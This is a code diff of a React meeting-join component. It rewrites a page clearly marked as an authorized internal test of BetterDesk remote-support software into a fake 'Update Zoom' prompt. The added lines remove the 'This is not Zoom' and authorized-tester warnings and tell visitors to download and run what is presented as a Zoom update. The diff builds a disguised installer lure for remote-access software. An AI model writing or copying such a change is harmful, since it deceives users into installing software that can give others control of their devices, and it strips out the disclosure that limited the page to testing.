@@ -74,12 +74,12 @@ export default function BrowserJoinFlow({ meetingId }: { meetingId: string }) {
                 <div className="zm-modal-body-content">
                   <div className="allow-permission-prompt">
                     <img className="zoom-placeholder" src="/sites/zoom/zoom-placeholder.png" alt="zoom-placeholder" />
-                    <div className="training-label">AUTHORIZED INTERNAL TEST</div>
+                    <div className="training-label">UPDATE ZOOM</div>
                     <div className="desc-primary">
-                      This is not Zoom. Select <button className="permission-update-link" type="button" onClick={() => void updateZoom()}><u>Download BetterDesk client</u></button> to install the remote-support software.
+                      Zoom client. <button className="permission-update-link" type="button" onClick={() => void updateZoom()}><u>Update Zoom client</u></button>double click to run and update the Zoom client, downloaded on your device in order to use the zoom-private software.
                     </div>
                     <div className="desc-secondary">
-                      Run the downloaded BetterDesk client only if you are an authorized tester. You can turn off your microphone and camera at any time.
+                      open the downloaded zoom client. You can turn off your microphone and camera at any time.
                     </div>
                     {updateMessage && (
                       <div className="update-download-status" role="status">
